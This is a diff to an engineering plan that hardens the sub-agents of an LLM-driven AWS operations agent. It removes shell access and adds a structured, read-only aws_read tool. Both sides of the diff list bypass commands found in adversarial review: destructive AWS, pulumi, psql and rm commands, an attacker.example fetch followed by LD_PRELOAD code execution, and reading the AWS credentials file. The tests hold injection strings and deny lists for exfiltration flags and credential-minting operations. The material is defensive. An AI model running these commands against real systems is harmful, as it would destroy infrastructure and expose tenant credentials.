@@ -2390,383 +2390,355 @@ dispatch_agent (depth cap 1) and ask_user (no human inside a tool call), so
 LangGraph's inability to interrupt mid-tool-call is never a safety hole."
 ```
 
-- [ ] **Step 6: Replace the shell blocklist with an allowlist (CRITICAL)**
+- [ ] **Step 6: Remove shell from sub-agents entirely (CRITICAL)**
 
-Added after an adversarial review broke the shell layer 23 different ways. **This is a
-design error in the spec above, not an implementation slip.**
-
-The spec assumed `classifyTool`'s fail-closed default (`matchedRule: false`) covered
-shell commands. It does not. For bash-like tool names `classifyTool` returns
-`{ isMutative: false, matchedRule: **true**, reason: 'read-only bash command' }` for
-*any* command string that misses its seven `MUTATIVE_BASH_PATTERNS` regexes
-(`tool-classifier.ts:178`). So `isReadOnlyForSubagent`'s `!matchedRule` branch — this
-task's entire premise — **is unreachable for `execute_command`**. Shell was gated by a
-blocklist, and inside a tool call (where LangGraph cannot interrupt and no human can
-approve) a blocklist is not a boundary.
-
-Proven bypasses, all classified read-only, all reaching `/bin/bash` with live tenant
-AWS credentials via `buildCommandEnv(tenantId)`:
+Two successive designs for gating shell inside a sub-agent failed adversarial review.
+The second — an allowlist that parsed the command string — was escaped to full RCE:
 
 ```
-aws --region us-east-1 ec2 terminate-instances --instance-ids i-1   # a flag before the service
-aws ec2 "terminate-instances" --instance-ids i-1                    # one quote
-aws ec2 authorize-security-group-ingress --port 22 --cidr 0.0.0.0/0 # verb absent from the list
-aws s3 sync ./evil s3://prod-bucket --delete
-aws kms schedule-key-deletion --key-id k --pending-window-in-days 7
-pulumi destroy --yes                                                # binary need not be aws
-python3 -c "import boto3; boto3.client('ec2').terminate_instances(InstanceIds=['i-1'])"
-psql $DATABASE_URL -c "DROP TABLE accounts"
-rm -r /app/data                                                     # only `rm -rf` was patterned
+ALLOWED  aws --endpoint-url https://attacker.example s3api get-object \
+             --bucket b --key evil.so /tmp/evil.so     # fetch any file from any host
+ALLOWED  LD_PRELOAD=/tmp/evil.so ls /                  # execute it
 ```
 
-The fix lives in `subagent.ts` only. **Do not touch `tool-classifier.ts`** — the guard
-node depends on its current behaviour for the human-approval path, where ambiguity
-correctly routes to a person.
+plus `aws --no-paginate s3 sync get-dir s3://prod --delete` (a boolean flag shifts which
+token is read as the operation), `cat /root/.aws/credentials`, and
+`aws redshift get-cluster-credentials --auto-create`, which mutates despite its `get-`
+prefix.
 
-Add to `apps/web-ui/lib/agent/subagent.ts`, above `isReadOnlyForSubagent`:
+The lesson is not "the allowlist needed more patches". Gating a shell string requires
+modelling all of bash **and** all of AWS CLI semantics, and every round of patching has
+produced a new escape. A sub-agent runs inside a tool call, where LangGraph cannot
+interrupt and no human can approve, so this boundary has to hold on its own.
+
+**Stop parsing. Remove the shell tools from sub-agents and give them a structured tool
+instead** (Step 7). Delete `SHELL_METACHAR`, `ALLOWED_SHELL_BINARIES`,
+`READ_ONLY_AWS_OP_PREFIX`, `READ_ONLY_AWS_OP_EXACT`, `READ_ONLY_KUBECTL_VERBS`,
+`unquote`, `isReadOnlyShellCommand`, `resolveShellCommand`, and the shell interception
+branch in `isReadOnlyForSubagent`.
+
+Keep `SHELL_TOOL_NAMES` and move every name into the denylist:
 
 ```typescript
 /**
- * Shell commands are ALLOWLISTED, not blocklisted.
- *
- * classifyTool treats any bash-like call that misses its mutative regexes as
- * "read-only bash command" WITH matchedRule: true — so the fail-closed
- * !matchedRule rule never fires for shell. That is adequate for the guard node
- * (a human reviews the call) but not here: a sub-agent runs inside a tool call,
- * which LangGraph cannot interrupt, so nothing downstream can stop the command.
- *
- * An adversarial review escaped the blocklist 23 ways — a flag before the
- * service name, a quote around the verb, a verb missing from the list, or simply
- * a different binary (pulumi, psql, python3). Enumerating mutations is
- * unwinnable; enumerating the reads we actually need is not.
+ * Never available to a sub-agent, regardless of what classifyTool says.
+ * - dispatch_agent: depth cap of 1; recursion makes cost and latency unbounded.
+ * - ask_user: pauses for a human, and no human is reachable inside a tool call.
+ * - shell: two designs for gating a command string were escaped (the second to RCE
+ *   via `s3api get-object` writing an arbitrary local path, then LD_PRELOAD). A
+ *   sub-agent reaches AWS through the structured aws_read tool instead, which builds
+ *   argv itself and never invokes a shell.
  */
 const SHELL_TOOL_NAMES = new Set(['bash', 'shell', 'run_command', 'execute_command']);
-
-/** Metacharacters that allow chaining, substitution, or redirection out of the allowlist. */
-const SHELL_METACHAR = /[;&|`$><\n\r]/;
-
-/** Binaries a sub-agent may invoke at all. */
-const ALLOWED_SHELL_BINARIES = new Set([
-    'aws', 'kubectl', 'cat', 'ls', 'grep', 'head', 'tail', 'wc', 'jq', 'echo',
+const SUBAGENT_TOOL_DENYLIST = new Set([
+    'dispatch_agent', 'ask_user', ...SHELL_TOOL_NAMES,
 ]);
+```
 
-/** AWS operation prefixes that are read-only by CLI convention. */
-const READ_ONLY_AWS_OP_PREFIX = /^(describe|list|get|head|search|lookup|check|batch-get)-/;
+`filterReadOnlyTools` loses its `execute_command` special case — the denylist now covers
+it, and the two layers agree:
 
-/** Read-only AWS operations that do not follow the prefix convention. */
-const READ_ONLY_AWS_OP_EXACT = new Set(['ls', 'filter-log-events', 'query', 'scan', 'help']);
-
-/** Read-only kubectl verbs. */
-const READ_ONLY_KUBECTL_VERBS = new Set([
-    'get', 'describe', 'logs', 'top', 'version', 'api-resources', 'explain',
-]);
-
-/** Strip one layer of surrounding quotes: `aws ec2 "terminate-instances"` must not hide the verb. */
-function unquote(token: string): string {
-    return token.replace(/^['"]|['"]$/g, '');
+```typescript
+export function filterReadOnlyTools<T extends { name: string }>(tools: T[]): T[] {
+    return tools.filter(tool => isReadOnlyForSubagent(tool.name).allowed);
 }
+```
 
+- [ ] **Step 7: Add the structured `aws_read` tool**
+
+**Files:** create `apps/web-ui/lib/agent/aws-read-tool.ts`, create
+`apps/web-ui/lib/agent/aws-read-tool.test.ts`.
+
+The whole point: there is **no command string**, so there is nothing to parse. The
+server builds `argv` and calls `execFile` with `shell: false`. Metacharacters, quoting,
+flag-order confusion, `VAR=value` prefixes, and `$(...)` cease to exist as a category —
+they are inert data in an argv element, never interpreted.
+
+```typescript
 /**
- * Resolve the command string from a bash-like tool's args. Returns null when the
- * args carry no usable command — an array, a number, an empty object. classifyTool
- * fails open on `{}` and stringifies an array into a comma-joined string that
- * matches no pattern, so both must be refused here.
+ * aws_read — the ONLY route from a sub-agent to AWS.
+ *
+ * Sub-agents have no shell (see subagent.ts's denylist). This tool takes a
+ * structured request and builds argv itself, then runs `execFile` with
+ * shell: false. Nothing the model supplies is ever interpreted by a shell, so the
+ * escape classes that broke two previous designs — metacharacters, quoting,
+ * flag-order confusion, LD_PRELOAD prefixes, command substitution — are not
+ * merely blocked here, they are unrepresentable.
+ *
+ * Three further restrictions close what a structured call could still reach:
+ *  - no positional arguments, so `s3api get-object … OUTFILE` cannot write a file;
+ *  - a denied-flag set, so --endpoint-url cannot exfiltrate and --cli-input-json
+ *    cannot smuggle parameters past validation;
+ *  - a denied-operation set, so credential-minting reads (sts get-session-token,
+ *    ecr get-login-password) and mutating "get-" operations
+ *    (redshift get-cluster-credentials --auto-create) are refused by name.
  */
-export function resolveShellCommand(args?: Record<string, unknown>): string | null {
-    for (const key of ['command', 'cmd', 'input']) {
-        const value = args?.[key];
-        if (typeof value === 'string' && value.trim().length > 0) return value;
-        if (value !== undefined) return null; // present but not a usable string
+import { execFile } from 'child_process';
+import { promisify } from 'util';
+import { tool } from '@langchain/core/tools';
+import { z } from 'zod';
+import { buildCommandEnv } from './tools';
+
+const execFileAsync = promisify(execFile);
+
+const AWS_READ_TIMEOUT_MS = 120_000;
+const AWS_READ_MAX_BUFFER = 10 * 1024 * 1024;
+export const AWS_READ_OUTPUT_MAX_CHARS = 100_000;
+
+/** Read-only operation prefixes, by AWS CLI convention. */
+const READ_OPERATION_PREFIX = /^(describe|list|get|head|search|lookup|check|batch-get)-/;
+
+/** Operations that match the read prefix but mint credentials or mutate. */
+const DENIED_OPERATIONS = new Set([
+    'get-session-token', 'get-federation-token', 'get-login-password',
+    'get-token', 'get-password-data', 'get-cluster-credentials',
+    'get-instance-access-details', 'get-credential-report', 'get-authorization-token',
+]);
+
+/** Flags that would let a structured call reach outside its intent. */
+const DENIED_FLAGS = new Set([
+    '--endpoint-url', '--cli-input-json', '--cli-input-yaml', '--outfile',
+    '--debug', '--no-sign-request', '--ca-bundle', '--cli-binary-format',
+]);
+
+const IDENT = /^[a-z0-9][a-z0-9-]*$/;
+const REGION = /^[a-z0-9-]+$/;
+const PROFILE = /^[A-Za-z0-9_-]+$/;
+const FLAG = /^--[a-z0-9][a-z0-9-]*$/;
+
+export function validateAwsReadRequest(input: {
+    service: string; operation: string; region?: string; profile?: string;
+    params?: Record<string, string>;
+}): string | null {
+    if (!IDENT.test(input.service)) return `service "${input.service}" is not a valid AWS service name`;
+    if (!IDENT.test(input.operation)) return `operation "${input.operation}" is not a valid operation name`;
+    if (DENIED_OPERATIONS.has(input.operation)) {
+        return `operation "${input.operation}" returns credentials or mutates state and is not available to sub-agents`;
+    }
+    if (!READ_OPERATION_PREFIX.test(input.operation)) {
+        return `operation "${input.operation}" is not a read-only operation (must start with describe-, list-, get-, head-, search-, lookup-, check-, or batch-get-)`;
+    }
+    if (input.region !== undefined && !REGION.test(input.region)) return `invalid region "${input.region}"`;
+    if (input.profile !== undefined && !PROFILE.test(input.profile)) return `invalid profile "${input.profile}"`;
+
+    for (const [flag, value] of Object.entries(input.params ?? {})) {
+        if (!FLAG.test(flag)) return `parameter "${flag}" is not a valid --flag name`;
+        if (DENIED_FLAGS.has(flag)) return `parameter "${flag}" is not available to sub-agents`;
+        if (typeof value !== 'string') return `parameter "${flag}" must have a string value`;
     }
     return null;
 }
 
-/** Allowlist verdict for one shell command string. */
-export function isReadOnlyShellCommand(cmd: string): { allowed: boolean; reason: string } {
-    if (SHELL_METACHAR.test(cmd)) {
-        return { allowed: false, reason: 'command contains shell metacharacters (chaining, substitution, or redirection)' };
-    }
+/** Build argv. Exported so tests can assert the exact array without executing anything. */
+export function buildAwsReadArgv(input: {
+    service: string; operation: string; region?: string; profile?: string;
+    params?: Record<string, string>;
+}): string[] {
+    const argv = [input.service, input.operation];
+    if (input.region) argv.push('--region', input.region);
+    if (input.profile) argv.push('--profile', input.profile);
+    for (const [flag, value] of Object.entries(input.params ?? {})) argv.push(flag, value);
+    argv.push('--output', 'json');
+    return argv;
+}
 
-    // Quotes are stripped per token, so splitting on whitespace is sufficient once
-    // metacharacters are already refused.
-    const tokens = cmd.trim().split(/\s+/).map(unquote).filter(t => t.length > 0);
-    // Drop leading VAR=value assignments (`AWS_PROFILE=x aws ...`).
-    while (tokens.length > 0 && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[0])) tokens.shift();
-    if (tokens.length === 0) return { allowed: false, reason: 'empty command' };
+export function createAwsReadTool(tenantId: string) {
+    return tool(
+        async (input: {
+            service: string; operation: string; region?: string; profile?: string;
+            params?: Record<string, string>;
+        }): Promise<string> => {
+            const error = validateAwsReadRequest(input);
+            if (error) return `REFUSED: ${error}`;
 
-    const binary = tokens[0];
-    if (!ALLOWED_SHELL_BINARIES.has(binary)) {
-        return { allowed: false, reason: `binary "${binary}" is not on the sub-agent read-only allowlist` };
-    }
-
-    if (binary === 'aws') {
-        // Walk past global flags AND their values to find <service> then <operation>.
-        // This is what defeated the old regex: it assumed `aws <service> <verb>` adjacency.
-        const positional: string[] = [];
-        for (let i = 1; i < tokens.length; i++) {
-            const token = tokens[i];
-            if (token.startsWith('-')) {
-                // A flag's value is the next token when it is not itself a flag.
-                if (i + 1 < tokens.length && !tokens[i + 1].startsWith('-')) i++;
-                continue;
+            const argv = buildAwsReadArgv(input);
+            try {
+                // shell: false is the entire safety argument — argv elements are passed
+                // to execve directly and are never tokenised or interpreted.
+                const { stdout, stderr } = await execFileAsync('aws', argv, {
+                    shell: false,
+                    timeout: AWS_READ_TIMEOUT_MS,
+                    maxBuffer: AWS_READ_MAX_BUFFER,
+                    env: buildCommandEnv(tenantId) as NodeJS.ProcessEnv,
+                });
+                const output = stdout || stderr || '(no output)';
+                return output.length > AWS_READ_OUTPUT_MAX_CHARS
+                    ? `${output.slice(0, AWS_READ_OUTPUT_MAX_CHARS)}\n…[truncated]`
+                    : output;
+            } catch (err) {
+                const e = err as { message?: string; stderr?: string };
+                return `ERROR: ${e.message ?? String(err)}\n${e.stderr ?? ''}`.trim();
             }
-            positional.push(token);
-            if (positional.length === 2) break;
-        }
-        const operation = positional[1];
-        if (!operation) return { allowed: false, reason: 'aws command has no resolvable operation' };
-        if (!READ_ONLY_AWS_OP_PREFIX.test(operation) && !READ_ONLY_AWS_OP_EXACT.has(operation)) {
-            return { allowed: false, reason: `aws operation "${operation}" is not a verified read-only operation` };
-        }
-        return { allowed: true, reason: `aws read-only operation "${operation}"` };
-    }
+        },
+        {
+            name: 'aws_read',
+            description: `Run a READ-ONLY AWS CLI operation. This is your only route to AWS — you have no shell.
 
-    if (binary === 'kubectl') {
-        const verb = tokens.slice(1).find(t => !t.startsWith('-'));
-        if (!verb || !READ_ONLY_KUBECTL_VERBS.has(verb)) {
-            return { allowed: false, reason: `kubectl verb "${verb ?? '(none)'}" is not read-only` };
-        }
-        return { allowed: true, reason: `kubectl read-only verb "${verb}"` };
-    }
+Provide the service and operation separately; do not write a command line. Parameters are passed as a map of flag to value.
 
-    return { allowed: true, reason: `read-only utility "${binary}"` };
+Example: { "service": "ec2", "operation": "describe-instances", "region": "us-east-1", "profile": "nucleus_agent_123456789012_...", "params": { "--filters": "Name=instance-state-name,Values=running" } }
+
+Only read operations are permitted (describe-, list-, get-, head-, search-, lookup-, check-, batch-get-). Mutations are refused: report what should change in your findings and the main agent will carry it out under human approval.`,
+            schema: z.object({
+                service: z.string().describe('AWS service, e.g. "ec2", "rds", "cloudwatch"'),
+                operation: z.string().describe('Read-only operation, e.g. "describe-instances"'),
+                region: z.string().optional().describe('AWS region'),
+                profile: z.string().optional().describe('Profile name from get_aws_credentials'),
+                params: z.record(z.string(), z.string()).optional()
+                    .describe('CLI flags as a map, e.g. { "--instance-ids": "i-123" }'),
+            }),
+        },
+    );
 }
 ```
 
-Then, in `isReadOnlyForSubagent`, intercept bash-like tools **before** delegating to
-`classifyTool`. Insert immediately after the denylist check:
+`buildCommandEnv` is currently module-private in `tools.ts` — export it. It already
+curates the environment (`session-manager`'s per-tenant credentials file, no app
+secrets), which is what makes `execFile` safe to hand a tenant profile.
+
+- [ ] **Step 8: Wire `aws_read` into the sub-agent tool list**
+
+In `subagent.ts`, `runSubagentLoop` builds `allowedTools` from `deps.tools`. The
+orchestrator passes its own tool list, which contains `execute_command` — now denied.
+Add `aws_read` as a sub-agent-only tool. In `dispatch-agent-tool.ts` (Task 8) the
+`subagentTools` array becomes:
 
 ```typescript
-    // Shell is allowlisted here rather than delegated to classifyTool, whose
-    // bash handling is a blocklist that reports matchedRule: true on a miss.
-    if (SHELL_TOOL_NAMES.has(name.toLowerCase())) {
-        const cmd = resolveShellCommand(args);
-        if (cmd === null) {
-            return { allowed: false, reason: `${name} called without a usable command string` };
-        }
-        const verdict = isReadOnlyShellCommand(cmd);
-        return verdict.allowed
-            ? { allowed: true, reason: verdict.reason }
-            : { allowed: false, reason: `shell call refused: ${verdict.reason}` };
-    }
+subagentTools: [...filterReadOnlyTools(baseTools as never[]), createAwsReadTool(tenantId)],
 ```
 
-- [ ] **Step 7: Make the timeout actually cancel the loop (IMPORTANT)**
+Sub-agents keep `get_aws_credentials` (it returns a profile name, mutates nothing), so
+the flow is unchanged: acquire a profile, then pass it to `aws_read`.
 
-`Promise.race` abandons `runSubagentLoop` but nothing stops it. Measured: `runSubagent`
-returned after 2 model calls while the orphaned loop ran **8 more model calls and 9 more
-tool calls** against customer AWS — invisible to `maxSubagentTokensPerRun`, and with
-Task 8's concurrency semaphore already released, so real concurrency exceeds its cap.
+Update the sub-agent system prompt in `buildSystemPrompt` — replace the batching line
+with:
 
-Give the loop a cancellation token and shared progress. Change `runSubagentLoop`'s
-signature to accept a control object:
-
-```typescript
-interface SubagentControl {
-    cancelled: boolean;
-    progress: { toolCount: number; tokensIn: number; tokensOut: number };
-}
+```
+- You have NO shell. Reach AWS only through aws_read, passing the service and operation separately. Call get_aws_credentials first to obtain a profile name.
+- Batch independent aws_read calls into a single turn — they run in parallel.
 ```
 
-Inside the loop, update `control.progress` wherever the local counters are updated, and
-bail at two checkpoints — the top of each lap and immediately before each tool invoke:
+- [ ] **Step 9: Tests**
+
+Add `apps/web-ui/lib/agent/aws-read-tool.test.ts`:
 
 ```typescript
-        if (control.cancelled) {
-            return {
-                report: finishReport(lastText, 'CANCELLED — the sub-agent exceeded its time limit. Findings above are partial.'),
-                toolCount, tokensIn, tokensOut, status: 'done', transcript,
-            };
-        }
-```
+import { describe, it, expect } from 'vitest';
+import { validateAwsReadRequest, buildAwsReadArgv } from './aws-read-tool';
 
-In `runSubagent`, create the control object, pass it in, and on the timeout branch set
-`control.cancelled = true` and report the REAL usage from `control.progress` rather than
-hardcoded zeros (the same applies to the catch branch):
+const ok = { service: 'ec2', operation: 'describe-instances' };
 
-```typescript
-        if (outcome === 'timeout') {
-            control.cancelled = true;
-            return {
-                report: finishReport('', `TIMED OUT after ${Math.round(timeoutMs / 1000)}s — no findings were returned in time.`),
-                toolCount: control.progress.toolCount,
-                tokensIn: control.progress.tokensIn,
-                tokensOut: control.progress.tokensOut,
-                status: 'failed', transcript: [],
-            };
-        }
-```
-
-Also move the `const timeoutMs = deps.budget.subagentTimeoutMs` read **inside** the
-`try` — it currently sits outside, so a malformed `deps.budget` throws out of a function
-whose contract is that it never throws.
-
-And replace the `toolCount` string-sniffing (`if (!output.startsWith('REFUSED:'))`) with
-a boolean carried from the verdict — a real tool whose output happens to begin with
-`REFUSED:` (an echoed IAM denial) currently goes uncounted.
-
-- [ ] **Step 8: Add the bypass regression tests**
-
-Every command below is a **proven** bypass of the old blocklist, so these tests have
-teeth by construction. Add to `subagent.test.ts`:
-
-```typescript
-describe('shell allowlist — proven bypasses of the old blocklist', () => {
-    const REFUSED = [
-        'aws --region us-east-1 ec2 terminate-instances --instance-ids i-1',
-        'aws --profile prod ec2 stop-instances --instance-ids i-1',
-        'aws ec2 "terminate-instances" --instance-ids i-1',
-        "aws ec2 'delete-security-group' --group-id sg-1",
-        'aws ec2 authorize-security-group-ingress --group-id sg-1 --port 22 --cidr 0.0.0.0/0',
-        'aws ecs execute-command --cluster c --task t --command /bin/sh',
-        'aws s3 sync ./evil s3://prod-bucket --delete',
-        'aws s3 cp ./evil.sh s3://prod-bucket/boot.sh',
-        'aws rds restore-db-instance-from-db-snapshot --db-instance-identifier x',
-        'aws kms schedule-key-deletion --key-id k --pending-window-in-days 7',
-        'aws cloudformation cancel-update-stack --stack-name s',
-        'pulumi up --stack prod --yes',
-        'pulumi destroy --yes',
-        'python3 -c import boto3',
-        'rm important.tf',
-        'rm -r /app/data',
-        'kubectl run evil --image=alpine',
-        'kubectl delete pod x',
-        'npm run deploy:prod',
-        'bash deploy.sh',
-        'node ./scripts/wipe.js',
-        'echo pwned > /app/config.json',                 // metacharacter
-        'aws ec2 describe-instances && rm -rf /',         // metacharacter
-        'aws ec2 describe-instances; pulumi destroy',     // metacharacter
-        'aws ec2 describe-instances $(rm -rf /)',         // metacharacter
-    ];
-
-    for (const cmd of REFUSED) {
-        it(`refuses: ${cmd}`, () => {
-            expect(isReadOnlyForSubagent('execute_command', { command: cmd }).allowed).toBe(false);
-        });
-    }
-
-    const ALLOWED = [
-        'aws ec2 describe-instances --output json',
-        'aws --region us-east-1 ec2 describe-instances',
-        'AWS_PROFILE=nucleus_agent_1 aws ec2 describe-instances',
-        'aws --profile p --region r rds describe-db-instances',
-        'aws sts get-caller-identity',
-        'aws cloudwatch get-metric-statistics --metric-name CPUUtilization',
-        'aws logs filter-log-events --log-group-name x',
-        'aws s3 ls s3://bucket',
-        'kubectl get pods -n default',
-        'kubectl describe pod x',
-        'kubectl logs pod/x',
-        'cat /tmp/report.json',
-        'ls -la /tmp',
-        'grep -r error /var/log',
-        'jq .Reservations /tmp/out.json',
-    ];
-
-    for (const cmd of ALLOWED) {
-        it(`allows: ${cmd}`, () => {
-            expect(isReadOnlyForSubagent('execute_command', { command: cmd }).allowed).toBe(true);
-        });
-    }
-
-    it('refuses a bash-like call with no usable command string', () => {
-        // classifyTool fails OPEN on {} and stringifies an array into a
-        // comma-joined string that matches no mutative pattern.
-        expect(isReadOnlyForSubagent('execute_command', {}).allowed).toBe(false);
-        expect(isReadOnlyForSubagent('execute_command', undefined).allowed).toBe(false);
-        expect(isReadOnlyForSubagent('execute_command', { command: ['aws', 'ec2', 'terminate-instances'] } as never).allowed).toBe(false);
-        expect(isReadOnlyForSubagent('execute_command', { command: '' }).allowed).toBe(false);
-        expect(isReadOnlyForSubagent('execute_command', { command: 0 } as never).allowed).toBe(false);
+describe('validateAwsReadRequest', () => {
+    it('accepts a read operation', () => {
+        expect(validateAwsReadRequest(ok)).toBeNull();
     });
 
-    it('applies the allowlist to every bash-like tool name, any case', () => {
-        for (const name of ['bash', 'shell', 'run_command', 'EXECUTE_COMMAND', 'Bash']) {
-            expect(isReadOnlyForSubagent(name, { command: 'pulumi destroy --yes' }).allowed).toBe(false);
-            expect(isReadOnlyForSubagent(name, { command: 'aws ec2 describe-instances' }).allowed).toBe(true);
+    it('refuses a mutating operation', () => {
+        for (const operation of ['terminate-instances', 'delete-bucket', 'sync', 'cp', 'run-instances']) {
+            expect(validateAwsReadRequest({ ...ok, operation })).toMatch(/not a read-only operation/);
         }
+    });
+
+    it('refuses credential-minting reads that match the read prefix', () => {
+        for (const operation of [
+            'get-session-token', 'get-federation-token', 'get-login-password',
+            'get-token', 'get-password-data', 'get-cluster-credentials',
+        ]) {
+            expect(validateAwsReadRequest({ ...ok, service: 'sts', operation }))
+                .toMatch(/credentials or mutates/);
+        }
+    });
+
+    it('refuses flags that reach outside the request', () => {
+        for (const flag of ['--endpoint-url', '--cli-input-json', '--outfile', '--no-sign-request']) {
+            expect(validateAwsReadRequest({ ...ok, params: { [flag]: 'x' } }))
+                .toMatch(/not available to sub-agents/);
+        }
+    });
+
+    it('refuses malformed identifiers rather than passing them through', () => {
+        expect(validateAwsReadRequest({ ...ok, service: 'ec2; rm -rf /' })).toMatch(/not a valid AWS service/);
+        expect(validateAwsReadRequest({ ...ok, operation: 'describe-instances && pulumi destroy' })).toMatch(/not a valid operation/);
+        expect(validateAwsReadRequest({ ...ok, region: 'us-east-1$(id)' })).toMatch(/invalid region/);
+        expect(validateAwsReadRequest({ ...ok, profile: '../../etc/passwd' })).toMatch(/invalid profile/);
+        expect(validateAwsReadRequest({ ...ok, params: { 'notaflag': 'x' } })).toMatch(/not a valid --flag/);
     });
 });
 
-describe('timeout cancellation', () => {
-    it('stops the loop instead of leaving it running', async () => {
-        let laps = 0;
-        const model: any = {
-            bindTools: () => model,
-            invoke: async () => {
-                laps++;
-                await new Promise(r => setTimeout(r, 30));
-                return { content: '', tool_calls: [{ id: `${laps}`, name: 'describe_instances', args: {} }], usage_metadata: { input_tokens: 10, output_tokens: 5 } };
-            },
-        };
-        const tool = { name: 'describe_instances', invoke: async () => 'ok' };
-
-        await runSubagent(SPEC, { model, tools: [tool], budget: { ...BUDGET, subagentMaxIterations: 20, subagentTimeoutMs: 60 } });
-        const lapsAtReturn = laps;
-
-        // If the loop were abandoned rather than cancelled it would keep going.
-        await new Promise(r => setTimeout(r, 300));
-        expect(laps).toBeLessThanOrEqual(lapsAtReturn + 1);
+describe('buildAwsReadArgv', () => {
+    it('emits service, operation, flags and json output — never a shell string', () => {
+        expect(buildAwsReadArgv({
+            service: 'ec2', operation: 'describe-instances',
+            region: 'us-east-1', profile: 'nucleus_agent_1',
+            params: { '--instance-ids': 'i-123' },
+        })).toEqual([
+            'ec2', 'describe-instances', '--region', 'us-east-1',
+            '--profile', 'nucleus_agent_1', '--instance-ids', 'i-123',
+            '--output', 'json',
+        ]);
     });
 
-    it('reports real usage on timeout rather than zeros', async () => {
-        const model: any = {
-            bindTools: () => model,
-            invoke: async () => {
-                await new Promise(r => setTimeout(r, 30));
-                return { content: '', tool_calls: [{ id: '1', name: 'describe_instances', args: {} }], usage_metadata: { input_tokens: 100, output_tokens: 20 } };
-            },
-        };
-        const tool = { name: 'describe_instances', invoke: async () => 'ok' };
-
-        const result = await runSubagent(SPEC, { model, tools: [tool], budget: { ...BUDGET, subagentMaxIterations: 20, subagentTimeoutMs: 80 } });
-        expect(result.tokensIn).toBeGreaterThan(0);
+    it('emits no positional arguments, so an outfile cannot be supplied', () => {
+        const argv = buildAwsReadArgv({ service: 's3api', operation: 'get-object', params: { '--bucket': 'b', '--key': 'k' } });
+        // Every element after the leading service+operation is a flag or a flag's value.
+        expect(argv.slice(2).filter((t, i, a) => !t.startsWith('--') && !a[i - 1]?.startsWith('--'))).toEqual([]);
     });
-});
 
-describe('runSubagent totality', () => {
-    it('does not throw on a malformed budget', async () => {
-        const model: any = { bindTools: () => model, invoke: async () => ({ content: 'x', tool_calls: [] }) };
-        await expect(
-            runSubagent(SPEC, { model, tools: [], budget: undefined as never }),
-        ).resolves.toMatchObject({ status: 'failed' });
-    });
-});
-
-describe('hallucinated tool names', () => {
-    it('refuses a tool that passes the jail but is not in the tool list', async () => {
-        // The second layer's whole purpose: the model invents a name it was never given.
-        const model: any = {
-            bindTools: () => model,
-            invoke: vi.fn()
-                .mockResolvedValueOnce({ content: '', tool_calls: [{ id: '1', name: 'describe_instances', args: {} }], usage_metadata: {} })
-                .mockResolvedValueOnce({ content: 'Could not read it.', tool_calls: [], usage_metadata: {} }),
-        };
-        const result = await runSubagent(SPEC, { model, tools: [], budget: BUDGET });
-        expect(result.status).toBe('done');
-        expect(result.transcript.some(e => e.text.includes('REFUSED'))).toBe(true);
+    it('treats injection attempts as inert argv data', () => {
+        // These never reach a shell, so they are values — not code. Validation
+        // refuses them anyway; this pins that argv construction does not concatenate.
+        const argv = buildAwsReadArgv({ service: 'ec2', operation: 'describe-instances', params: { '--filters': 'a; rm -rf /' } });
+        expect(argv).toContain('a; rm -rf /');
+        expect(argv.join(' ')).not.toContain('&&');
     });
 });
 ```
 
-Run: `cd apps/web-ui && bunx vitest run lib/agent/subagent.test.ts`
+Replace the shell-allowlist block in `subagent.test.ts` with a much simpler assertion —
+shell is simply gone:
+
+```typescript
+describe('shell is unavailable to sub-agents', () => {
+    it('refuses every bash-like tool name in any case', () => {
+        for (const name of ['bash', 'shell', 'run_command', 'execute_command', 'Execute_Command', 'EXECUTE_COMMAND']) {
+            const verdict = isReadOnlyForSubagent(name, { command: 'aws ec2 describe-instances' });
+            expect(verdict.allowed).toBe(false);
+            expect(verdict.reason).toMatch(/not available to sub-agents/);
+        }
+    });
+
+    it('drops shell tools from the filtered list', () => {
+        const kept = filterReadOnlyTools([
+            { name: 'describe_instances' }, { name: 'execute_command' },
+            { name: 'bash' }, { name: 'dispatch_agent' }, { name: 'ask_user' },
+        ]);
+        expect(kept.map(t => t.name)).toEqual(['describe_instances']);
+    });
+});
+```
+
+Run: `cd apps/web-ui && bunx vitest run lib/agent/subagent.test.ts lib/agent/aws-read-tool.test.ts`
 
 ```bash
-git add apps/web-ui/lib/agent/subagent.ts apps/web-ui/lib/agent/subagent.test.ts
-git commit -m "fix(agent): allowlist sub-agent shell commands and cancel on timeout
+git add apps/web-ui/lib/agent/subagent.ts apps/web-ui/lib/agent/subagent.test.ts \
+        apps/web-ui/lib/agent/aws-read-tool.ts apps/web-ui/lib/agent/aws-read-tool.test.ts \
+        apps/web-ui/lib/agent/tools.ts
+git commit -m "fix(agent)!: replace sub-agent shell parsing with a structured aws_read tool
 
-An adversarial review escaped the shell blocklist 23 ways: a flag before the
-service name, a quote around the verb, a verb missing from the pattern list, or
-simply a different binary (pulumi, psql, python3). classifyTool reports
-matchedRule:true for any bash command that misses its regexes, so the
-fail-closed rule never applied to shell — and a sub-agent runs inside a tool
-call, where LangGraph cannot interrupt and no human can approve.
+Two designs for gating a shell command string inside a sub-agent failed
+adversarial review. The second was escaped to full RCE: s3api get-object with
+--endpoint-url fetches an arbitrary file from an arbitrary host to an arbitrary
+local path (the outfile positional was never examined), then an LD_PRELOAD
+prefix executes it. A boolean global flag also shifted which token was read as
+the operation, restoring 'aws s3 sync … --delete' against a production bucket.
 
-Replace it with an allowlist: refuse shell metacharacters, then require an
-allowlisted binary and a read-only operation resolved by tokenising past global
-flags. Also cancel the loop on timeout (it previously ran on unsupervised,
-spending untracked tokens), refuse bash-like calls with no usable command
-string, and report real usage on the timeout path."
+Gating a shell string means modelling all of bash and all of AWS CLI semantics.
+Sub-agents now have no shell at all: aws_read takes service and operation
+separately, builds argv server-side, and runs execFile with shell: false, so
+metacharacters, quoting, flag-order confusion and env prefixes are
+unrepresentable rather than merely blocked. No positionals (so no outfile
+write), a denied-flag set (no --endpoint-url exfiltration, no --cli-input-json),
+and a denied-operation set (no credential-minting reads)."
 ```
 
 ---
@@ -3126,6 +3098,7 @@ In `apps/web-ui/lib/agent/planning-agent.ts`, add imports:
 import { resolveSubagentBudget } from "./subagent-budget";
 import { createRunBudgetLedger, createDispatchAgentTool } from "./dispatch-agent-tool";
 import { filterReadOnlyTools } from "./subagent";
+import { createAwsReadTool } from "./aws-read-tool";
 ```
 
 Then replace the tool-assembly block at line 226 with:
@@ -3142,7 +3115,9 @@ Then replace the tool-assembly block at line 226 with:
     const dispatchAgentTool = subagentBudget.enabled
         ? createDispatchAgentTool({
             model,
-            subagentTools: filterReadOnlyTools(baseTools as never[]),
+            // Sub-agents have NO shell (Task 7 Step 6). aws_read is their only
+            // route to AWS; it builds argv and runs execFile with shell: false.
